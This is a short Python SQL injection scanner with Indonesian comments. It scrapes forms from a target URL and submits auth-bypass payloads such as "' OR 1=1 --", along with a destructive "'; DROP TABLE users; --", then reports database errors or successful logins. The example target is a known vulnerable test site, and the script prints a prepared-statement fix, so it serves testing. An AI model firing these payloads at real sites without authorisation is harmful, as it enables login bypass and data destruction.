import requests
from bs4 import BeautifulSoup

# Payload dasar buat ngecek SQL Injection
PAYLOADS = [
    "'",                     # Error based
    "' OR '1'='1",           # Auth bypass
    "\" OR \"1\"=\"1",       # Auth bypass (double quote)
    "' OR 1=1 --",           # Auth bypass + comment
    "'; DROP TABLE users; --" # Cek bahaya (jangan dijalanin beneran)
]

# Tanda-tanda error SQL yang umum muncul
SQL_ERRORS = [
    "sql syntax", "mysql_fetch", "ora-", "sqlite", 
    "postgresql", "warning: mysql", "unclosed quotation mark"
]

def cek_sqli(url, method="GET"):
    print(f"[*] Mulai ngecek: {url}")
    
    # Ambil form yang ada di halaman
    try:
        r = requests.get(url, timeout=5)
        soup = BeautifulSoup(r.text, "html.parser")
        forms = soup.find_all("form")
        
        if not forms:
            print("[!] Gak nemu form di halaman ini. Coba cek URL langsung ke endpoint form-nya.")
            return False
            
        for form in forms:
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            
            # Kumpulin input field
            inputs = {}
            for inp in form.find_all("input"):
                name = inp.get("name")
                if name and inp.get("type") not in ["submit", "button", "hidden"]:
                    inputs[name] = "test"
            
            if not inputs:
                continue
                
            print(f"[*] Nemuin form. Action: {action}, Method: {method}")
            
            # Tes satu-satu payload
            for payload in PAYLOADS:
                data = {k: payload for k in inputs.keys()}
                
                try:
                    if method == "post":
                        resp = requests.post(action, data=data, timeout=5)
                    else:
                        resp = requests.get(action, params=data, timeout=5)
                    
                    # 1. Cek error SQL di response
                    for err in SQL_ERRORS:
                        if err.lower() in resp.text.lower():
                            print(f"[!] KEMUNGKINAN RENTAN! Payload '{payload}' memicu error database.")
                            print(f"    Fix: Pakai prepared statements / parameterized queries[citation:1][citation:14].")
                            return True
                            
                    # 2. Cek login bypass (kalau halaman login)
                    if "login" in action.lower() or "auth" in action.lower():
                        if "welcome" in resp.text.lower() or "logout" in resp.text.lower():
                            print(f"[!] KEMUNGKINAN BYPASS! Payload '{payload}' sukses login.")
                            return True
                            
                except requests.exceptions.RequestException:
                    continue
                    
        print("[+] Selesai. Nggak nemu indikasi SQL Injection dasar.")
        print("[i] Tetap waspada: ini cuma tes dasar, bukan jaminan 100% aman.")
        return False

    except Exception as e:
        print(f"[!] Error: {e}")
        return False

if __name__ == "__main__":
    target = input("Masukin URL target (contoh: http://testphp.vulnweb.com/login.php): ")
    cek_sqli(target)